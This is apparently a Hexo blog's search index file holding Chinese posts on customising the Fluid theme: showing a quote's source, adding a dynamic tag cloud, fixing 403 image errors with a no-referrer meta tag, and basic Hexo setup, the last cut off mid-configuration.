<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hexo美化之一言添加出处</title>
    <link href="/2024/07/14/Hexo/Hexo%E7%BE%8E%E5%8C%96%E4%B9%8B%E4%B8%80%E8%A8%80%E6%B7%BB%E5%8A%A0%E5%87%BA%E5%A4%84/"/>
    <url>/2024/07/14/Hexo/Hexo%E7%BE%8E%E5%8C%96%E4%B9%8B%E4%B8%80%E8%A8%80%E6%B7%BB%E5%8A%A0%E5%87%BA%E5%A4%84/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="Hexo美化之一言添加出处"><a href="#Hexo美化之一言添加出处" class="headerlink" title="Hexo美化之一言添加出处"></a>Hexo美化之一言添加出处</h1><p>​本人博客使用的是Fluid主题，Fluid主题首页Slogan可以选择显示一言，但是Fluid配置只能显示一言的内容，而不能显示一言的出处，因此本期博客将会对Fluid主题进行改造。</p><h2 id="修改博客代码"><a href="#修改博客代码" class="headerlink" title="修改博客代码"></a>修改博客代码</h2><p><strong>typed.ejs</strong></p><p>修改<code>layout\_partial\plugins</code>目录下的<code>typed.ejs</code>，此文件实现了通过api获取一言的功能，其中打印一言也在文件内实现，我们只需要稍微改造一下使其打印出出处即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;% <span class="hljs-keyword">if</span>(theme.<span class="hljs-property">fun_features</span>.<span class="hljs-property">typing</span>.<span class="hljs-property">enable</span> &amp;&amp; <span class="hljs-title function_">in_scope</span>(theme.<span class="hljs-property">fun_features</span>.<span class="hljs-property">typing</span>.<span class="hljs-property">scope</span>) &amp;&amp; page.<span class="hljs-property">subtitle</span> !== <span class="hljs-literal">false</span>) &#123; %&gt;<br>  &lt;%- <span class="hljs-title function_">js_ex</span>(theme.<span class="hljs-property">static_prefix</span>.<span class="hljs-property">typed</span>, <span class="hljs-string">&#x27;/typed.min.js&#x27;</span>) %&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    (<span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable language_">window</span>, <span class="hljs-variable language_">document</span></span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">      <span class="hljs-keyword">var</span> typing = <span class="hljs-title class_">Fluid</span>.<span class="hljs-property">plugins</span>.<span class="hljs-property">typing</span>;</span></span><br><span class="language-javascript"><span class="language-xml">      <span class="hljs-keyword">var</span> subtitle = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;subtitle&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">      <span class="hljs-keyword">if</span> (!subtitle || !typing) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">return</span>;</span></span><br><span class="language-javascript"><span class="language-xml">      &#125;</span></span><br><span class="language-javascript"><span class="language-xml">      <span class="hljs-keyword">var</span> text = subtitle.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;data-typed-text&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">      &lt;% <span class="hljs-keyword">if</span> (<span class="hljs-title function_">is_home</span>() &amp;&amp; theme.<span class="hljs-property">index</span>.<span class="hljs-property">slogan</span>.<span class="hljs-property">api</span> &amp;&amp; theme.<span class="hljs-property">index</span>.<span class="hljs-property">slogan</span>.<span class="hljs-property">api</span>.<span class="hljs-property">enable</span>) &#123; %&gt;</span></span><br><span class="language-javascript"><span class="language-xml">        jQuery.<span class="hljs-title function_">ajax</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml">          <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;&lt;%= theme.index.slogan.api.method %&gt;&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">          <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;&lt;%- theme.index.slogan.api.url %&gt;&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">          <span class="hljs-attr">headers</span>: &lt;%- <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(theme.<span class="hljs-property">index</span>.<span class="hljs-property">slogan</span>.<span class="hljs-property">api</span>.<span class="hljs-property">headers</span> || &#123;&#125;) %&gt;,</span></span><br><span class="language-javascript"><span class="language-xml">          <span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;json&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">          <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">var</span> apiText;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">var</span> apiFrom;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">if</span> (result) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">              <span class="hljs-keyword">var</span> text_keys = <span class="hljs-string">&#x27;&lt;%= theme.index.slogan.api.text_keys %&gt;&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">              <span class="hljs-keyword">var</span> from_keys = <span class="hljs-string">&#x27;&lt;%= theme.index.slogan.api.from_keys %&gt;&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">              <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                result = result[<span class="hljs-number">0</span>];</span></span><br><span class="language-javascript"><span class="language-xml">              &#125;</span></span><br><span class="language-javascript"><span class="language-xml">              data = result</span></span><br><span class="language-javascript"><span class="language-xml">              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">of</span> text_keys) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-keyword">var</span> value = result[k];</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                  apiText = <span class="hljs-string">&#x27;『&#x27;</span> + value + <span class="hljs-string">&#x27;』&#x27;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">                  <span class="hljs-keyword">break</span>;</span></span><br><span class="language-javascript"><span class="language-xml">                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                  result = value;</span></span><br><span class="language-javascript"><span class="language-xml">                &#125;</span></span><br><span class="language-javascript"><span class="language-xml">              &#125;</span></span><br><span class="language-javascript"><span class="language-xml">              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">of</span> from_keys) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-keyword">var</span> value = data[k];</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                  apiText += <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>+ <span class="hljs-string">&#x27;——&#x27;</span> + <span class="hljs-string">&#x27;「&#x27;</span> + value + <span class="hljs-string">&#x27;」&#x27;</span> ;</span></span><br><span class="language-javascript"><span class="language-xml">                  <span class="hljs-keyword">break</span>;</span></span><br><span class="language-javascript"><span class="language-xml">                &#125;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                  data = value;</span></span><br><span class="language-javascript"><span class="language-xml">                &#125;</span></span><br><span class="language-javascript"><span class="language-xml">              &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            apiText ? <span class="hljs-title function_">typing</span>(apiText) : <span class="hljs-title function_">typing</span>(text);</span></span><br><span class="language-javascript"><span class="language-xml">          &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">          <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, status, error</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">if</span> (error) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">              <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Failed to request &lt;%= theme.index.slogan.api.url %&gt;:&#x27;</span>, error);</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-title function_">typing</span>(text);</span></span><br><span class="language-javascript"><span class="language-xml">          &#125;</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;)</span></span><br><span class="language-javascript"><span class="language-xml">      &lt;% &#125; <span class="hljs-keyword">else</span> &#123; %&gt;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-title function_">typing</span>(text);</span></span><br><span class="language-javascript"><span class="language-xml">      &lt;% &#125; %&gt;</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;)(<span class="hljs-variable language_">window</span>, <span class="hljs-variable language_">document</span>);</span></span><br><span class="language-javascript"><span class="language-xml">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;% &#125; %&gt;<br></code></pre></td></tr></table></figure><p>其基本原理就是，遍历<code>theme.index.slogan.api.text_keys</code>和<code>theme.index.slogan.api.text_keys</code>两个变量，提取json数据中对应的字段，<code>theme.index.slogan.api.text_keys</code>即为<code>_config.fluid.yml</code>配置的字段，这里重新修改了字段因此还要再<code>_config.fluid.yml</code>修改相应的字段。</p><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p><strong>_config.fluid.yml</strong></p><p>定位到<code>_config.fluid.yml</code>中的<code>slogan</code>字段，修改为下面内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">slogan:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">api:</span><br>      <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;https://v1.hitokoto.cn/&quot;</span><br>      <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;GET&quot;</span><br>      <span class="hljs-attr">headers:</span> &#123;&#125;<br>      <span class="hljs-comment"># 一言内容</span><br>      <span class="hljs-attr">text_keys:</span> [<span class="hljs-string">&#x27;hitokoto&#x27;</span>]<br>      <span class="hljs-comment"># y</span><br>      <span class="hljs-attr">from_keys:</span> [<span class="hljs-string">&#x27;from&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hero</category>
      
      <category>博客美化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
      <tag>博客美化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客美化之动态标签云</title>
    <link href="/2024/07/14/Hexo/Hexo%E7%BE%8E%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E6%A0%87%E7%AD%BE%E4%BA%91/"/>
    <url>/2024/07/14/Hexo/Hexo%E7%BE%8E%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E6%A0%87%E7%AD%BE%E4%BA%91/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="Hexo博客美化之动态标签云"><a href="#Hexo博客美化之动态标签云" class="headerlink" title="Hexo博客美化之动态标签云"></a>Hexo博客美化之动态标签云</h1><p>​动态标签云是指在博客标签界面的标签是动态运动的，而不是原来的静态排列，有一说一，确实好看，开整开整。</p><p><img src="https://img-blog.csdnimg.cn/direct/06caadaafc324c5cb7ced1b7fb942683.png" alt="image-20240714110613129"></p><h2 id="使用到的插件"><a href="#使用到的插件" class="headerlink" title="使用到的插件"></a>使用到的插件</h2><p><a href="https://github.com/D0n9X1n/hexo-tag-cloud">hexo-tag-cloud</a></p><p><a href="https://github.com/D0n9X1n/hexo-tag-cloud/blob/master/README.ZH.md">官方配置文档</a></p><h2 id="安装tag-cloud"><a href="#安装tag-cloud" class="headerlink" title="安装tag-cloud"></a>安装tag-cloud</h2><ul><li>进入hexo更目录，打开<code>package.json</code>，在<code>dependencies</code>添加最新版的tag-cloud，例如：<code>&quot;hexo-tag-cloud&quot;: &quot;2.1.*&quot;</code>。</li><li>执行<code>npm install</code>安装插件命令。</li><li>之后要去修改主题的<code>tagcloud</code>模板，不同引擎的主题修改内容不同，这里可以参考<a href="https://github.com/D0n9X1n/hexo-tag-cloud/blob/master/README.ZH.md">官方文档</a>，但是基本步骤类似，这里以fluid为例，其使用的是ejs引擎。</li></ul><h2 id="Fluid修改tagcloud模板"><a href="#Fluid修改tagcloud模板" class="headerlink" title="Fluid修改tagcloud模板"></a>Fluid修改<code>tagcloud</code>模板</h2><ul><li><p><code>Fluid</code>主题的标签云位于<code>node_modules\hexo-theme-fluid\layout\tags.ejs</code>文件内，因此需要修改该文件的内容，打开文件，标签云代码如下所示（不同版本可能会有一些出入，大体上都是类似的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;div class=&quot;text-center tagcloud&quot;&gt;<br>  &lt;%- tagcloud(&#123;<br>    min_font: min_font,<br>    max_font: max_font,<br>    amount: 999,<br>    unit: unit,<br>    color: true,<br>    start_color,<br>    end_color<br>  &#125;) %&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure></li><li><p>直接上原有的<code>tagcloud</code>注释掉，换上<code>tag-cloud</code>的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;div class=&quot;text-center tagcloud&quot;&gt;<br>  &lt;!-- &lt;%- tagcloud(&#123;<br>    min_font: min_font,<br>    max_font: max_font,<br>    amount: 999,<br>    unit: unit,<br>    color: true,<br>    start_color,<br>    end_color<br>  &#125;) %&gt; --&gt;<br>   &lt;% if (site.tags.length) &#123; %&gt;<br>  &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;&lt;%- url_for(&#x27;/js/tagcloud.js&#x27;) %&gt;&quot;&gt;&lt;/script&gt;<br>  &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;&lt;%- url_for(&#x27;/js/tagcanvas.js&#x27;) %&gt;&quot;&gt;&lt;/script&gt;<br>  &lt;div class=&quot;widget-wrap&quot;&gt;<br>    &lt;h3 class=&quot;widget-title&quot;&gt;&lt;%= __(&#x27;tagcloud&#x27;) %&gt;&lt;/h3&gt;<br>    &lt;div id=&quot;myCanvasContainer&quot; class=&quot;widget tagcloud&quot;&gt;<br>      &lt;canvas width=&quot;250&quot; height=&quot;250&quot; id=&quot;resCanvas&quot; style=&quot;width:100%&quot;&gt;<br>        &lt;%- tagcloud() %&gt;<br>      &lt;/canvas&gt;<br>    &lt;/div&gt;<br>  &lt;/div&gt;<br>&lt;% &#125; %&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure></li><li><p>配置完成后，可以通过 <code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</code> 来进行本地预览, hexo clean 为必须选项。</p></li></ul><h2 id="修复标签云高糊"><a href="#修复标签云高糊" class="headerlink" title="修复标签云高糊"></a>修复标签云高糊</h2><p>​上过上述步骤后，理论上，标签云已经搭建完成了，但是但是，打开网页发现标签太大了，并且高糊，难受死了，好在有解决方法。</p><p><img src="https://img-blog.csdnimg.cn/direct/440c1e08119a4658ab5658eabaac4582.png" alt="image-20240714092910818"></p><ul><li><p>在标签云页面，F12打开控制台，找到标签云元素<code>canvas</code>，审查样式，可以修改<code>width</code>和<code>height</code>进行，知道感觉画面比较舒服。我这里使用的代码如下：</p><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs erb"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-center tagcloud&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-comment">&lt;!-- &lt;%-</span></span><span class="language-ruby"> tagcloud(&#123;</span><br><span class="language-ruby">    <span class="hljs-symbol">min_font:</span> min_font,</span><br><span class="language-ruby">    <span class="hljs-symbol">max_font:</span> max_font,</span><br><span class="language-ruby">    <span class="hljs-symbol">amount:</span> <span class="hljs-number">999</span>,</span><br><span class="language-ruby">    <span class="hljs-symbol">unit:</span> unit,</span><br><span class="language-ruby">    <span class="hljs-symbol">color:</span> <span class="hljs-literal">true</span>,</span><br><span class="language-ruby">    start_color,</span><br><span class="language-ruby">    end_color</span><br><span class="language-ruby">  &#125;) </span><span class="language-xml"><span class="hljs-comment">%&gt; --&gt;</span></span><br><span class="language-xml">    &lt;%</span><span class="language-ruby"> <span class="hljs-keyword">if</span> (site.tags.length) &#123; </span><span class="language-xml">%&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;%-</span></span></span><span class="language-ruby"> url_for(<span class="hljs-string">&#x27;/js/tagcloud.js&#x27;</span>) </span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">%&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;%-</span></span></span><span class="language-ruby"> url_for(<span class="hljs-string">&#x27;/js/tagcanvas.js&#x27;</span>) </span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">%&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;widget-wrap&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-comment">&lt;!-- &lt;h3 class=&quot;widget-title&quot;&gt;&lt;%=</span></span><span class="language-ruby"> __(<span class="hljs-string">&#x27;好多标签啊&#x27;</span>) </span><span class="language-xml"><span class="hljs-comment">%&gt;&lt;/h3&gt; --&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myCanvasContainer&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;widget tagcloud&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;600&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;600&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;resCanvas&quot;</span> &lt;/<span class="hljs-attr">canvas</span>&gt;</span>&gt;</span><br><span class="language-xml">          &lt;%-</span><span class="language-ruby"> tagcloud() </span><span class="language-xml">%&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">  &lt;%</span><span class="language-ruby"> &#125; </span><span class="language-xml">%&gt;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>同时，我还把字体调整了一下，在博客根目录<code>_config.yml</code>添加下面配置即可，目前看上去很舒服，( •̀ ω •́ )✧。</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># hexo-tag-cloud</span><br><span class="hljs-attr">tag_cloud:</span><br>    <span class="hljs-attr">textFont:</span> <span class="hljs-string">Trebuchet</span> <span class="hljs-string">MS,</span> <span class="hljs-string">Helvetica</span><br>    <span class="hljs-attr">textColor:</span> <span class="hljs-string">&#x27;#333&#x27;</span><br>    <span class="hljs-attr">textHeight:</span> <span class="hljs-number">30</span><br>    <span class="hljs-attr">outlineColor:</span> <span class="hljs-string">&#x27;#E2E1D1&#x27;</span><br>    <span class="hljs-attr">maxSpeed:</span> <span class="hljs-number">0.15</span><br>    <span class="hljs-attr">pauseOnSelected:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># true 意味着当选中对应 tag 时,停止转动</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hero</category>
      
      <category>博客美化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
      <tag>博客美化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo图床图片不显示</title>
    <link href="/2024/07/12/Hexo/Hexo%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA/"/>
    <url>/2024/07/12/Hexo/Hexo%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="Hexo图床qq图片不显示"><a href="#Hexo图床qq图片不显示" class="headerlink" title="Hexo图床qq图片不显示"></a>Hexo图床qq图片不显示</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>​最近刚搭好Hexo博客，想上传个笔记试试来着，发现图床图片根本不显示，看了一下控制台，一堆报错，这里记录一下解决方案，希望能帮助到遇到同样问题的同学。</p><p><img src="https://img-blog.csdnimg.cn/direct/e91bc8dcedf445dcafd6b90f201f768e.png" alt="image-20240712101539674"></p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ul><li><p>首先确定一下具体问题缘由</p><ul><li><p>检查一下图床链接是否正常</p></li><li><p>检查浏览器控制台报错信息</p><p>我这里报错403，应该是网络资源被拒绝了</p></li></ul></li><li><p>解决方案：</p><p>只需要在markdown文章开头添加一个<code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;</code>即可正常显示图片。</p></li></ul><h2 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h2><ul><li><p>HTML的 标签提供了 HTML 文档的元数据。元数据不会显示在客户端，但是会被浏览器解析。这也是为什么加在mardown文章里不会看到这段代码的原因。</p></li><li><p>HTML 的 name 属性规定了元数据的名称，这里我们用到的是referer属性，这个属性的作用是让服务器判断来源页面，即用户是从哪来的，很多时候referer被当做防盗链来使用，服务器根据你的访问来源判断是否应该让你下载这个资源，如果你的来源不和规范，比如是个恶意爬虫，那么就会产生403错误。通过浏览器查看请求数据，我们可以看到请求referer为<code>http://localhost:8080/</code>，被服务器直接给拦截了</p><p><img src="https://img-blog.csdnimg.cn/direct/575c48b7c76b47078f404d86d02e7dad.png" alt="image-20240712102058495"></p></li><li><p>到这里，<code>content=&quot;no-referrer&quot;</code>的意义就呼之欲出了，既然我们想拿到这个资源但被服务器认出来之后又被拒绝了，那么伪装一下，不告诉服务器不就行了？所以，这里content的no-referer就是表示不发送引用数据，隐藏自己的来源信息。这样，图片就能正常显示了。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Hero</category>
      
      <category>疑难杂症</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>疑难杂症</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人博客搭建</title>
    <link href="/2024/07/11/Hexo/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/07/11/Hexo/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="Hexo-安装配置"><a href="#Hexo-安装配置" class="headerlink" title="Hexo 安装配置"></a>Hexo 安装配置</h2><h3 id="Hexo-初始化"><a href="#Hexo-初始化" class="headerlink" title="Hexo 初始化"></a>Hexo 初始化</h3><ul><li><p>Hexo配置需要<code>git</code>和<code>node.js</code>两个依赖组件，具体安装步骤可以直接去<a href="https://hexo.io/zh-cn/docs/">官方文档</a>查看。</p></li><li><p>安装Hexo后完成后，初始化Hexo：</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">hexo init <span class="hljs-symbol">&lt;folder&gt;</span><br><span class="hljs-keyword">cd</span> <span class="hljs-symbol">&lt;folder&gt;</span><br>npm install<br></code></pre></td></tr></table></figure><ul><li>初始化完成后，打开项目目录下的<code>_config.yml</code>，根据自己需求修改一下内容。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Site</span><br><span class="hljs-attr">title:</span>                      <span class="hljs-comment"># 必填，输入网站标题</span><br><span class="hljs-attr">subtitle:</span>                   <span class="hljs-comment"># 